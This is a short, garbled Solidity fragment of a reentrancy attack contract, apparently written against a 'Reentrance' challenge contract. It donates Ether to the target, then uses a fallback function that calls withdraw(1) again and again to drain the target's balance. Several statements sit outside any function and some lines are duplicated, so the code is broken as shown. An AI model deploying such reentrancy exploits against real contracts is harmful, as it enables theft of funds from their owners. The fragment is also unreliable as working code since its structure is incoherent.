address public target;
    uint32 public i = 0;
    constructor(address _target) payable {
        target=_target;
    }

     bytes memory payload=abi.encodeWithSignature("donate(address)",_to);
    (bool success,)=target.call{value:val}(payload);
    require(success,"target.call failed");

fallback() external payable {
    i++;
    require(i<target.balance,"error here");
    Reentrance(payable(target)).withdraw(1);
}

 function callwithdraw() public 
    {
        target.call(abi.encodeWithSignature("withdraw(uint)",1));
    }

    i++;
    require(i<target.balance);


